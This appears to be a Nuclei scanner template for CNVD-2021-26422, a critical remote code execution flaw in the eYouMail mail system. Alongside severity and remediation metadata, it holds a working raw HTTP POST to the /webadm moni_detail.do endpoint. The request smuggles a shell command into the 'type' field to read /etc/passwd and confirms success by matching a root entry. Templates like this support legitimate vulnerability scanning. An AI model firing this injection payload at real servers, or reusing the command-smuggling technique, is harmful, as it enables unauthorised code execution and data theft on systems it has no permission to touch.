id: CNVD-2021-26422
info:
  name: eYouMail - Remote Code Execution
  author: daffainfo
  severity: critical
  description: The eYouMail application is vulnerable to a remote code execution exploit
    identified as CNVD-2021-26422.
  reference:
  - https://github.com/ltfafei/my_POC/blob/master/CNVD-2021-26422_eYouMail/CNVD-2021-26422_eYouMail_RCE_POC.py
  - https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CNVD-2021-26422).md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: eyoumail,rce,cnvd,cnvd2021
  metadata:
    impact: The impact of CNVD-2021-26422 vulnerability in eYouMail is that attackers
      can execute arbitrary code on the targeted system, potentially leading to unauthorized
      access and data breaches.
    recommendation: I recommend updating eYouMail software to the latest version to
      patch the remote code execution vulnerability CNVD-2021-26422.
requests:
- raw:
  - 'POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    type=''|cat /etc/passwd||''

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
